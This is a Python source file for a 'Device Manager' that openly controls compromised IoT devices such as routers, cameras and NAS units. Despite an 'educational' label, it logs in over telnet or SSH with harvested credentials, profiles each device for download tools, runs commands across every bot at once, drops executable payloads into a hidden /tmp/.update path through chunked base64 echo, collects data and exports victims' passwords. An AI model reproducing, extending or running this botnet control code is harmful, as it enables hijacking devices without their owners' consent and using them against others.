#!/usr/bin/env python3
"""
Device Manager - IoT Device Management and Control
Educational/Research Purpose Only

Manages compromised IoT devices including:
- Device connection and authentication
- Command execution and control
- Device health monitoring
- Payload deployment
- Data collection from devices
- Device categorization and profiling
"""

import os
import time
import threading
import socket
import telnetlib
import paramiko
import ftplib
import json
import random
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass
from enum import Enum

class DeviceStatus(Enum):
    ACTIVE = "active"
    UNREACHABLE = "unreachable"
    COMPROMISED = "compromised"
    LOST = "lost"
    QUARANTINED = "quarantined"

class DeviceType(Enum):
    ROUTER = "router"
    CAMERA = "camera"
    DVR = "dvr"
    PRINTER = "printer"
    NAS = "nas"
    IOT_DEVICE = "iot_device"
    UNKNOWN = "unknown"

@dataclass
class Device:
    host: str
    port: int
    username: str
    password: str
    device_type: DeviceType = DeviceType.UNKNOWN
    status: DeviceStatus = DeviceStatus.ACTIVE
    fingerprint: Dict = None
    last_contact: datetime = None
    compromise_time: datetime = None
    capabilities: List[str] = None
    payload_installed: bool = False
    
    def __post_init__(self):
        if self.fingerprint is None:
            self.fingerprint = {}
        if self.capabilities is None:
            self.capabilities = []
        if self.last_contact is None:
            self.last_contact = datetime.now()
        if self.compromise_time is None:
            self.compromise_time = datetime.now()

class DeviceManager:
    def __init__(self):
        self.devices: Dict[str, Device] = {}
        self.connection_pool = {}
        self.max_connections = 50
        self.connection_timeout = 10
        self.command_timeout = 30
        
        # Device management threads
        self.monitor_thread = None
        self.health_check_thread = None
        self.running = True
        
        # Start background threads
        self._start_background_tasks()
    
    def _start_background_tasks(self):
        """Start background monitoring and health check threads"""
        self.monitor_thread = threading.Thread(target=self._device_monitor_loop, daemon=True)
        self.monitor_thread.start()
        
        self.health_check_thread = threading.Thread(target=self._health_check_loop, daemon=True)
        self.health_check_thread.start()
    
    def add_device(self, host: str, port: int, username: str, password: str,
                   device_type: DeviceType = DeviceType.UNKNOWN, 
                   fingerprint: Dict = None) -> bool:
        """Add a new compromised device to management"""
        try:
            device = Device(
                host=host,
                port=port,
                username=username,
                password=password,
                device_type=device_type,
                fingerprint=fingerprint or {}
            )
            
            # Test connectivity
            if self._test_device_connectivity(device):
                self.devices[host] = device
                print(f"[+] Added device {host} to management")
                
                # Perform initial device profiling
                self._profile_device(device)
                
                return True
            else:
                print(f"[!] Failed to connect to device {host}")
                return False
                
        except Exception as e:
            print(f"[!] Error adding device {host}: {e}")
            return False
    
    def _test_device_connectivity(self, device: Device) -> bool:
        """Test if we can connect to a device"""
        try:
            if device.port == 23:  # Telnet
                return self._test_telnet_connection(device)
            elif device.port == 22:  # SSH
                return self._test_ssh_connection(device)
            else:
                # Generic socket test
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.connection_timeout)
                result = sock.connect_ex((device.host, device.port))
                sock.close()
                return result == 0
        except:
            return False
    
    def _test_telnet_connection(self, device: Device) -> bool:
        """Test telnet connection to device"""
        try:
            tn = telnetlib.Telnet(device.host, device.port, timeout=self.connection_timeout)
            
            # Attempt login
            tn.read_until(b"login: ", timeout=5)
            tn.write(device.username.encode() + b"\n")
            tn.read_until(b"Password: ", timeout=5)
            tn.write(device.password.encode() + b"\n")
            
            # Look for shell prompt
            response = tn.read_until(b"# ", timeout=5)
            tn.close()
            
            return b"#" in response or b"$" in response
        except:
            return False
    
    def _test_ssh_connection(self, device: Device) -> bool:
        """Test SSH connection to device"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(
                device.host,
                port=device.port,
                username=device.username,
                password=device.password,
                timeout=self.connection_timeout
            )
            ssh.close()
            return True
        except:
            return False
    
    def _profile_device(self, device: Device):
        """Profile device to determine capabilities and type"""
        try:
            # Execute profiling commands
            profiling_commands = [
                ("uname -a", "system_info"),
                ("cat /proc/cpuinfo", "cpu_info"),
                ("cat /proc/meminfo", "memory_info"),
                ("ps aux", "processes"),
                ("netstat -an", "network_connections"),
                ("mount", "filesystem_info"),
                ("cat /proc/version", "kernel_version"),
                ("which wget curl tftp", "download_tools"),
                ("ls -la /tmp", "tmp_directory"),
                ("id", "user_info")
            ]
            
            profile_data = {}
            for command, key in profiling_commands:
                try:
                    result = self.execute_command(device.host, command, timeout=10)
                    if result['success']:
                        profile_data[key] = result['output']
                except:
                    continue
            
            # Analyze profile data
            device.capabilities = self._analyze_device_capabilities(profile_data)
            device.device_type = self._classify_device_type(profile_data)
            device.fingerprint.update(profile_data)
            
            print(f"[*] Profiled device {device.host}: {device.device_type.value}")
            print(f"[*] Capabilities: {', '.join(device.capabilities)}")
            
        except Exception as e:
            print(f"[!] Device profiling failed for {device.host}: {e}")
    
    def _analyze_device_capabilities(self, profile_data: Dict) -> List[str]:
        """Analyze device capabilities from profile data"""
        capabilities = []
        
        try:
            # Check for download tools
            download_tools = profile_data.get('download_tools', '')
            if 'wget' in download_tools:
                capabilities.append('wget')
            if 'curl' in download_tools:
                capabilities.append('curl')
            if 'tftp' in download_tools:
                capabilities.append('tftp')
            
            # Check for shell features
            system_info = profile_data.get('system_info', '')
            if 'bash' in system_info:
                capabilities.append('bash')
            if 'busybox' in system_info:
                capabilities.append('busybox')
            
            # Check for network capabilities
            processes = profile_data.get('processes', '')
            if 'iptables' in processes:
                capabilities.append('firewall')
            if 'httpd' in processes or 'nginx' in processes:
                capabilities.append('web_server')
            
            # Check filesystem capabilities
            filesystem_info = profile_data.get('filesystem_info', '')
            if '/tmp' in filesystem_info and 'rw' in filesystem_info:
                capabilities.append('writable_tmp')
            
            # Check for cron
            if 'cron' in processes:
                capabilities.append('cron')
            
        except Exception as e:
            print(f"[!] Error analyzing capabilities: {e}")
        
        return capabilities
    
    def _classify_device_type(self, profile_data: Dict) -> DeviceType:
        """Classify device type based on profile data"""
        try:
            system_info = profile_data.get('system_info', '').lower()
            processes = profile_data.get('processes', '').lower()
            
            # Router detection
            if any(keyword in system_info for keyword in ['router', 'openwrt', 'dd-wrt']):
                return DeviceType.ROUTER
            if any(keyword in processes for keyword in ['hostapd', 'dnsmasq', 'pppd']):
                return DeviceType.ROUTER
            
            # Camera/DVR detection
            if any(keyword in processes for keyword in ['rtsp', 'onvif', 'camera', 'video']):
                return DeviceType.CAMERA
            if any(keyword in system_info for keyword in ['hisilicon', 'ambarella']):
                return DeviceType.CAMERA
            
            # Printer detection
            if any(keyword in processes for keyword in ['cups', 'lpd', 'printer']):
                return DeviceType.PRINTER
            
            # NAS detection
            if any(keyword in processes for keyword in ['smbd', 'nfs', 'storage']):
                return DeviceType.NAS
            
            # Generic IoT
            if 'arm' in system_info or 'mips' in system_info:
                return DeviceType.IOT_DEVICE
            
        except Exception as e:
            print(f"[!] Error classifying device type: {e}")
        
        return DeviceType.UNKNOWN
    
    def execute_command(self, host: str, command: str, timeout: int = None) -> Dict:
        """Execute command on a specific device"""
        if timeout is None:
            timeout = self.command_timeout
        
        device = self.devices.get(host)
        if not device:
            return {'success': False, 'error': 'Device not found'}
        
        try:
            if device.port == 23:
                return self._execute_telnet_command(device, command, timeout)
            elif device.port == 22:
                return self._execute_ssh_command(device, command, timeout)
            else:
                return {'success': False, 'error': 'Unsupported protocol'}
        except Exception as e:
            device.status = DeviceStatus.UNREACHABLE
            return {'success': False, 'error': str(e)}
    
    def _execute_telnet_command(self, device: Device, command: str, timeout: int) -> Dict:
        """Execute command via telnet"""
        try:
            tn = telnetlib.Telnet(device.host, device.port, timeout=self.connection_timeout)
            
            # Login
            tn.read_until(b"login: ", timeout=5)
            tn.write(device.username.encode() + b"\n")
            tn.read_until(b"Password: ", timeout=5)
            tn.write(device.password.encode() + b"\n")
            
            # Wait for prompt
            tn.read_until(b"# ", timeout=5)
            
            # Execute command
            tn.write(command.encode() + b"\n")
            
            # Read output
            output = tn.read_until(b"# ", timeout=timeout)
            tn.close()
            
            # Update device status
            device.last_contact = datetime.now()
            device.status = DeviceStatus.ACTIVE
            
            return {
                'success': True,
                'output': output.decode('utf-8', errors='ignore').strip(),
                'timestamp': datetime.now().isoformat()
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _execute_ssh_command(self, device: Device, command: str, timeout: int) -> Dict:
        """Execute command via SSH"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(
                device.host,
                port=device.port,
                username=device.username,
                password=device.password,
                timeout=self.connection_timeout
            )
            
            stdin, stdout, stderr = ssh.exec_command(command, timeout=timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            
            ssh.close()
            
            # Update device status
            device.last_contact = datetime.now()
            device.status = DeviceStatus.ACTIVE
            
            return {
                'success': True,
                'output': output,
                'error': error,
                'timestamp': datetime.now().isoformat()
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def execute_command_on_all(self, command: str, device_filter: callable = None) -> Dict[str, Dict]:
        """Execute command on all devices (or filtered subset)"""
        results = {}
        
        for host, device in self.devices.items():
            if device_filter and not device_filter(device):
                continue
            
            if device.status != DeviceStatus.ACTIVE:
                continue
            
            result = self.execute_command(host, command)
            results[host] = result
            
            # Small delay between commands
            time.sleep(random.uniform(0.1, 0.5))
        
        return results
    
    def deploy_payload(self, host: str, payload_data: bytes, target_path: str = "/tmp/.update") -> bool:
        """Deploy payload to a specific device"""
        device = self.devices.get(host)
        if not device:
            return False
        
        try:
            # Check if device has download capabilities
            if 'wget' in device.capabilities:
                return self._deploy_via_wget(device, payload_data, target_path)
            elif 'curl' in device.capabilities:
                return self._deploy_via_curl(device, payload_data, target_path)
            elif 'tftp' in device.capabilities:
                return self._deploy_via_tftp(device, payload_data, target_path)
            else:
                # Fallback: echo method (for small payloads)
                return self._deploy_via_echo(device, payload_data, target_path)
                
        except Exception as e:
            print(f"[!] Payload deployment failed for {host}: {e}")
            return False
    
    def _deploy_via_wget(self, device: Device, payload_data: bytes, target_path: str) -> bool:
        """Deploy payload using wget"""
        # This would typically involve setting up a temporary HTTP server
        # For educational purposes, we'll simulate the process
        print(f"[*] Would deploy payload to {device.host} via wget")
        return True
    
    def _deploy_via_echo(self, device: Device, payload_data: bytes, target_path: str) -> bool:
        """Deploy small payload using echo (base64 encoded)"""
        try:
            import base64
            
            # Encode payload as base64
            encoded_payload = base64.b64encode(payload_data).decode()
            
            # Split into chunks (some devices have command length limits)
            chunk_size = 1000
            chunks = [encoded_payload[i:i+chunk_size] for i in range(0, len(encoded_payload), chunk_size)]
            
            # Clear target file
            result = self.execute_command(device.host, f"rm -f {target_path}")
            if not result['success']:
                return False
            
            # Write chunks
            for i, chunk in enumerate(chunks):
                if i == 0:
                    cmd = f"echo '{chunk}' > {target_path}.b64"
                else:
                    cmd = f"echo '{chunk}' >> {target_path}.b64"
                
                result = self.execute_command(device.host, cmd)
                if not result['success']:
                    return False
            
            # Decode and set permissions
            decode_cmd = f"base64 -d {target_path}.b64 > {target_path} && chmod +x {target_path} && rm {target_path}.b64"
            result = self.execute_command(device.host, decode_cmd)
            
            if result['success']:
                device.payload_installed = True
                return True
            
        except Exception as e:
            print(f"[!] Echo deployment failed: {e}")
        
        return False
    
    def collect_device_data(self, host: str, data_commands: List[str]) -> Dict:
        """Collect specific data from a device"""
        device = self.devices.get(host)
        if not device:
            return {}
        
        collected_data = {}
        for command in data_commands:
            result = self.execute_command(host, command)
            if result['success']:
                collected_data[command] = result['output']
        
        return collected_data
    
    def _device_monitor_loop(self):
        """Background thread to monitor device status"""
        while self.running:
            try:
                for host, device in list(self.devices.items()):
                    # Check if device hasn't been contacted recently
                    if device.last_contact:
                        time_since_contact = datetime.now() - device.last_contact
                        if time_since_contact > timedelta(hours=1):
                            device.status = DeviceStatus.UNREACHABLE
                
                time.sleep(300)  # Check every 5 minutes
                
            except Exception as e:
                print(f"[!] Device monitor error: {e}")
                time.sleep(60)
    
    def _health_check_loop(self):
        """Background thread to perform health checks"""
        while self.running:
            try:
                # Health check subset of devices
                devices_to_check = [d for d in self.devices.values() 
                                  if d.status == DeviceStatus.ACTIVE]
                
                # Check up to 10 devices per cycle
                check_devices = random.sample(devices_to_check, min(10, len(devices_to_check)))
                
                for device in check_devices:
                    # Simple ping test
                    result = self.execute_command(device.host, "echo 'alive'", timeout=10)
                    if not result['success']:
                        device.status = DeviceStatus.UNREACHABLE
                        print(f"[!] Device {device.host} became unreachable")
                
                time.sleep(600)  # Health check every 10 minutes
                
            except Exception as e:
                print(f"[!] Health check error: {e}")
                time.sleep(300)
    
    def get_device_statistics(self) -> Dict:
        """Get statistics about managed devices"""
        stats = {
            'total_devices': len(self.devices),
            'active_devices': 0,
            'unreachable_devices': 0,
            'device_types': {},
            'payload_installed': 0,
            'last_activity': None
        }
        
        for device in self.devices.values():
            if device.status == DeviceStatus.ACTIVE:
                stats['active_devices'] += 1
            elif device.status == DeviceStatus.UNREACHABLE:
                stats['unreachable_devices'] += 1
            
            # Count device types
            device_type = device.device_type.value
            stats['device_types'][device_type] = stats['device_types'].get(device_type, 0) + 1
            
            if device.payload_installed:
                stats['payload_installed'] += 1
            
            # Track last activity
            if device.last_contact:
                if not stats['last_activity'] or device.last_contact > stats['last_activity']:
                    stats['last_activity'] = device.last_contact
        
        return stats
    
    def export_device_list(self, filename: str):
        """Export device list for backup or analysis"""
        try:
            export_data = []
            for device in self.devices.values():
                device_data = {
                    'host': device.host,
                    'port': device.port,
                    'username': device.username,
                    'password': device.password,  # Note: Should be encrypted in real scenario
                    'device_type': device.device_type.value,
                    'status': device.status.value,
                    'capabilities': device.capabilities,
                    'payload_installed': device.payload_installed,
                    'compromise_time': device.compromise_time.isoformat() if device.compromise_time else None,
                    'last_contact': device.last_contact.isoformat() if device.last_contact else None,
                    'fingerprint': device.fingerprint
                }
                export_data.append(device_data)
            
            with open(filename, 'w') as f:
                json.dump(export_data, f, indent=2)
            
            print(f"[*] Device list exported to {filename}")
            
        except Exception as e:
            print(f"[!] Failed to export device list: {e}")
    
    def stop(self):
        """Stop device manager and background threads"""
        self.running = False
        print("[*] Device manager stopped")
